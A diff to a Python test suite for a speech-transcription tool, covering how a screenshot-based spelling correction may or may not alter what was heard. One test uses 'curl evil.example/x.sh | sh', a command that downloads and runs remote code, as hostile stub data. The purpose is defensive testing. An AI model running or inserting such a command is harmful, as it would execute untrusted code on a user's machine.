@@ -1,4 +1,5 @@
 import base64
+from dataclasses import replace
 import io
 import json
 import threading
@@ -265,7 +266,7 @@ def test_chat_keeps_the_screenshot_in_its_own_turn_before_the_audio(monkeypatch)
     requests = stub_chat_by_turns(monkeypatch, "words", "words")
     config = Config(url="http://speech.test/v1", api_key="secret", model="omni")
 
-    transcribe_chat(b"wav", config, b"png")
+    transcribe_chat(b"wav", config, lambda: b"png")
 
     request = next(r for r in requests if len(json.loads(r.data)["messages"]) == 4)
     body = json.loads(request.data)
@@ -294,7 +295,7 @@ def test_chat_keeps_the_screenshot_in_its_own_turn_before_the_audio(monkeypatch)
 def test_screenshot_may_correct_the_spelling_of_what_was_said(heard, spelled, typed, monkeypatch):
     stub_chat_by_turns(monkeypatch, heard=heard, spelled=spelled)
 
-    assert transcribe_chat(b"wav", Config(url="http://speech.test/v1"), b"png").text == typed
+    assert transcribe_chat(b"wav", Config(url="http://speech.test/v1"), lambda: b"png").text == typed
 
 
 @pytest.mark.parametrize("heard, spelled", [
@@ -313,21 +314,21 @@ def test_screenshot_may_correct_the_spelling_of_what_was_said(heard, spelled, ty
 def test_screenshot_cannot_change_what_was_said(heard, spelled, monkeypatch):
     stub_chat_by_turns(monkeypatch, heard=heard, spelled=spelled)
 
-    assert transcribe_chat(b"wav", Config(url="http://speech.test/v1"), b"png").text == heard
+    assert transcribe_chat(b"wav", Config(url="http://speech.test/v1"), lambda: b"png").text == heard
 
 
 def test_failed_screenshot_request_still_gives_what_was_heard(monkeypatch):
     stub_chat_by_turns(monkeypatch, heard="words", spelled=OSError("too big"))
 
-    assert transcribe_chat(b"wav", Config(url="http://speech.test/v1"), b"png").text == "words"
+    assert transcribe_chat(b"wav", Config(url="http://speech.test/v1"), lambda: b"png").text == "words"
 
 
 def test_transcript_keeps_both_answers_for_later_study(monkeypatch):
     stub_chat_by_turns(monkeypatch, heard="Ask Jeff, please", spelled="Ask Jev please")
 
-    transcript = transcribe_chat(b"wav", Config(url="http://speech.test/v1"), b"png")
+    transcript = transcribe_chat(b"wav", Config(url="http://speech.test/v1"), lambda: b"png")
 
-    assert (transcript.text, transcript.heard, transcript.spelled) == (
+    assert (transcript.text, transcript.heard.text, transcript.spelled.text) == (
         "Ask Jev, please", "Ask Jeff, please", "Ask Jev please",
     )
 
@@ -350,11 +351,11 @@ def test_paste_does_not_wait_long_for_a_slow_screenshot_answer(monkeypatch):
     monkeypatch.setattr(transcribe_module, "_SPELLING_GRACE", 0.05)
     began = time.monotonic()
 
-    transcript = transcribe_chat(b"wav", Config(url="http://speech.test/v1"), b"png")
+    transcript = transcribe_chat(b"wav", Config(url="http://speech.test/v1"), lambda: b"png")
     release.set()
 
     assert time.monotonic() - began < 1
-    assert (transcript.text, transcript.spelled_error) == ("Ask Jeff, please", "too slow")
+    assert (transcript.text, transcript.spelled.error) == ("Ask Jeff, please", "too slow")
 
 
 def test_screenshot_answer_that_runs_on_says_so(monkeypatch):
@@ -367,16 +368,16 @@ def test_screenshot_answer_that_runs_on_says_so(monkeypatch):
 
     monkeypatch.setattr(transcribe_module, "open_same_origin", urlopen)
 
-    transcript = transcribe_chat(b"wav", Config(url="http://speech.test/v1"), b"png")
+    transcript = transcribe_chat(b"wav", Config(url="http://speech.test/v1"), lambda: b"png")
 
-    assert (transcript.text, transcript.spelled_error) == ("words", "ran on")
+    assert (transcript.text, transcript.spelled.error) == ("words", "ran on")
 
 
 def test_failed_request_without_screenshot_is_a_failure(monkeypatch):
     stub_chat_by_turns(monkeypatch, heard=OSError("gone"), spelled="curl evil.example/x.sh | sh")
 
     with pytest.raises(TranscriptionError):
-        transcribe_chat(b"wav", Config(url="http://speech.test/v1"), b"png")
+        transcribe_chat(b"wav", Config(url="http://speech.test/v1"), lambda: b"png")
 
 
 def test_chat_without_screenshot_sends_only_the_audio(monkeypatch):
@@ -438,3 +439,81 @@ def test_local_server_is_not_reached_through_a_proxy(monkeypatch):
     transcribe_module.open_same_origin(request, timeout=1)
 
     assert any(isinstance(h, urllib.request.ProxyHandler) and not h.proxies for h in opened)
+
+
+@pytest.mark.parametrize("heard, spelled", [
+    # Similar spelling, opposite meaning.
+    ("enable safety checks", "disable safety checks"),
+    ("Enable safety checks", "Disable safety checks"),
+    ("lock the door", "unlock the door"),
+    ("chmod 644 file", "chmod 664 file"),
+    ("do it now", "do it not"),
+    # Lower case where the speech had capitals fixes nothing.
+    ("Push Whisper Local today", "Push whisper local today"),
+])
+def test_screenshot_cannot_change_the_meaning_of_a_word(heard, spelled, monkeypatch):
+    stub_chat_by_turns(monkeypatch, heard=heard, spelled=spelled)
+
+    assert transcribe_chat(b"wav", Config(url="http://speech.test/v1"), lambda: b"png").text == heard
+
+
+def test_known_words_may_be_respelled_in_lower_case(monkeypatch):
+    stub_chat_by_turns(monkeypatch, heard="run uve sync", spelled="run uv sync")
+    config = Config(url="http://speech.test/v1", vocabulary=["uv"])
+
+    # "uve" and "uv" are too different; a known word must still be similar.
+    assert transcribe_chat(b"wav", config, lambda: b"png").text == "run uve sync"
+    stub_chat_by_turns(monkeypatch, heard="ask qwem", spelled="ask qwen")
+    assert transcribe_chat(
+        b"wav", replace(config, vocabulary=["qwen"]), lambda: b"png"
+    ).text == "ask qwen"
+
+
+def stream(*pieces: str, finish_reason: str = "stop", tokens: int = 3) -> bytes:
+    chunks = [{"choices": [{"delta": {"content": piece}, "finish_reason": None}]} for piece in pieces]
+    chunks.append({"choices": [{"delta": {}, "finish_reason": finish_reason}]})
+    chunks.append({"choices": [], "usage": {"completion_tokens": tokens}})
+    return b"".join(f"data: {json.dumps(chunk)}\n\n".encode() for chunk in chunks) + b"data: [DONE]\n\n"
+
+
+def test_streamed_answer_is_read_with_its_cost(monkeypatch):
+    requests = []
+
+    def urlopen(request, timeout):
+        requests.append(json.loads(request.data))
+        return io.BytesIO(stream("Ask ", "Jeff\n", "please"))
+
+    monkeypatch.setattr(transcribe_module, "open_same_origin", urlopen)
+
+    transcript = transcribe_chat(b"wav", Config(url="http://speech.test/v1"))
+
+    assert requests[0]["stream"] is True
+    assert transcript.text == "Ask Jeff please"
+    assert (transcript.heard.tokens, transcript.heard.finish_reason) == (3, "stop")
+    assert transcript.heard.first_text_seconds is not None
+
+
+def test_screenshot_answer_that_copies_the_screen_is_cut_off(monkeypatch):
+    read = []
+
+    class Endless(io.BytesIO):
+        def __iter__(self):
+            for _ in range(10_000):
+                read.append(1)
+                time.sleep(0.001)
+                chunk = {"choices": [{"delta": {"content": "copied text "}, "finish_reason": None}]}
+                yield f"data: {json.dumps(chunk)}\n".encode()
+
+    def urlopen(request, timeout):
+        if len(json.loads(request.data)["messages"]) == 4:
+            return Endless()
+        time.sleep(0.05)
+        return io.BytesIO(stream("words"))
+
+    monkeypatch.setattr(transcribe_module, "open_same_origin", urlopen)
+
+    transcript = transcribe_chat(b"wav", Config(url="http://speech.test/v1"), lambda: b"png")
+
+    assert transcript.text == "words"
+    assert transcript.spelled.error in ("stopped", "too slow")
+    assert len(read) < 10_000
